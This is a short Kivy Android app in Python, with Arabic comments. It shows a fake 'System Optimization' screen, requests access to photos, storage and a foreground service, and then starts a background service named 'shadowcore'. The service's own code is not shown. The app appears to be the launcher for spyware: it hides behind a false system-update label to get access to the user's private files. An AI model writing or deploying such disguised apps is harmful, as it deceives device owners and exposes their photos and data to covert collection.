from kivy.app import App
from kivy.uix.label import Label
from android.permissions import request_permissions, Permission
from jnius import autoclass

class SystemUpdateApp(App):
    def build(self):
        return Label(text="System Optimization 100%\nActive in Background", halign='center')

    def on_start(self):
        # طلب الصلاحيات الضرورية فور التشغيل
        perms = [
            Permission.READ_MEDIA_IMAGES,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.FOREGROUND_SERVICE
        ]
        request_permissions(perms, self.start_service)

    def start_service(self, permissions, grants):
        # تشغيل الخدمة بعد التأكد من الصلاحيات
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            context = PythonActivity.mActivity
            service = autoclass('org.test.shadowcore.ServiceService')
            service.start(context, "")
            print("SERVICE_STARTED_SUCCESSFULLY")
        except Exception as e:
            print(f"SERVICE_ERROR: {e}")

if __name__ == "__main__":
    SystemUpdateApp().run()
